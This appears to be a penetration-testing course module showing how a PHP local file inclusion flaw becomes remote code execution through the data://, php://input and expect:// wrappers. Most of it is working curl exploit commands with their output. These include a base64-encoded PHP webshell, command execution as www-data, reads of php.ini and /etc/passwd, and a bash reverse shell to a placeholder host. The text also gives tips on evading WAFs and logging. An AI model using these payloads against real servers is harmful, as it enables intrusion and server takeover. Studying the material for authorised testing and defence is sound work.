# PHP Wrappers for Remote Code Execution
PHP wrappers cross a significant line in LFI exploitation: you are no longer just reading files, you are executing arbitrary code on the server. The three wrappers covered here each have different prerequisites and delivery mechanisms, but the end result in all cases is a webshell running as the web server process user.

***
## Prerequisite Check: allow_url_include
Both the `data://` and `php://input` wrappers require `allow_url_include = On` in the PHP configuration. This is not enabled by default in modern PHP, but it remains common in legacy applications and some WordPress plugins that depend on it for legitimate functionality. 

Before attempting either attack, confirm the setting is enabled by reading the PHP config file through the LFI with the base64 filter:

```bash
# Apache
curl "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Nginx
curl "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini"
```

Decode and check the relevant setting:

```bash
echo 'W1BIUF0KCjs7Ozs7...' | base64 -d | grep allow_url_include
# allow_url_include = On
```

If the version is unknown, start at 8.x and work backwards. The path pattern stays the same, only the version number changes.

***
## data:// Wrapper
The [data:// wrapper](https://www.php.net/manual/en/wrappers.data.php) embeds the payload directly inside the URL as a data URI. It supports MIME types and base64 encoding natively, so you can pass encoded PHP code and have it decoded and executed inline. 

**Step 1:** Base64 encode a minimal PHP webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Step 2:** URL encode the base64 string (the `+` and `=` characters must be encoded) and embed in the wrapper:

```bash
curl -s 'http://TARGET/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

You can also pass raw PHP without base64 for quick testing when no WAF is present:

```
data://text/plain,<?php system($_GET["cmd"]); ?>&cmd=id
```

The base64 approach is preferred because it avoids triggering signature-based WAF rules that pattern-match on `<?php` in URL parameters. 
***
## php://input Wrapper
The [php://input wrapper](https://www.php.net/manual/en/wrappers.php.php) reads the raw POST request body and passes it to the include function for execution. The key difference from `data://` is that the payload travels in the POST body rather than the URL, making it invisible to WAFs and logging systems that only inspect URL parameters. 
```bash
curl -s -X POST \
  --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/index.php?language=php://input&cmd=id" | grep uid

# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `cmd` parameter is passed as a GET parameter while the webshell itself arrives via POST. If the vulnerable function only accepts POST and does not use `$_REQUEST`, you can embed the command directly in the payload instead:

```bash
curl -s -X POST \
  --data '<?php system("whoami"); ?>' \
  "http://TARGET/index.php?language=php://input"
```

For a full reverse shell via `php://input`:

```bash
curl -s -X POST \
  --data '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\''"); ?>' \
  "http://TARGET/index.php?language=php://input"
```

***
## expect:// Wrapper
The [expect wrapper](https://www.php.net/manual/en/wrappers.expect.php) is an external PHP extension designed specifically for automating interactive applications. Unlike `data://` and `php://input`, expect does not require `allow_url_include`. Instead it requires the extension itself to be installed and loaded.  It is rarely present by default but is found on some hosting environments that use it for legitimate automation. 
Check whether the extension is loaded:

```bash
echo 'W1BIUF0KCjs7...' | base64 -d | grep expect
# extension=expect
```

Finding the directive in `php.ini` confirms it is configured to load, but not necessarily that it loaded successfully at runtime. The only reliable confirmation is a live test:

```bash
curl -s "http://TARGET/index.php?language=expect://id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s "http://TARGET/index.php?language=expect://cat+/etc/passwd"
```

Commands with spaces use `+` as the separator in the URL. The expect wrapper executes commands directly without needing a PHP webshell as an intermediary, making it the most straightforward of the three wrappers when available. 

***
## Wrapper Comparison
| Wrapper | Requires allow_url_include | Payload Location | Default Availability | Detection Risk |
|---------|---------------------------|-----------------|---------------------|----------------|
| `data://` | Yes | URL parameter | Available in PHP | Higher (payload in URL) |
| `php://input` | Yes | POST body | Available in PHP | Lower (payload not in URL) |
| `expect://` | No | URL parameter | Requires extension install | Medium |
| `php://filter` | No | URL parameter | Available in PHP | Low (read only) |

***
## Decision Flow for Wrapper Selection
```
Check allow_url_include in php.ini
        |
        Yes                         No
        |                           |
Does the endpoint                Check expect
accept POST requests?             extension
        |                           |
   Yes      No                  Present?
   |         |                 Yes     No
php://    data://           expect://  Use log poisoning
input     wrapper           wrapper    or file upload methods
```

When none of the three wrappers are available, the fallback path is log poisoning via the Apache or Nginx access log, `/proc/self/environ` injection via the User-Agent header, or PHP session file injection, all of which are covered in the following sections of this module.
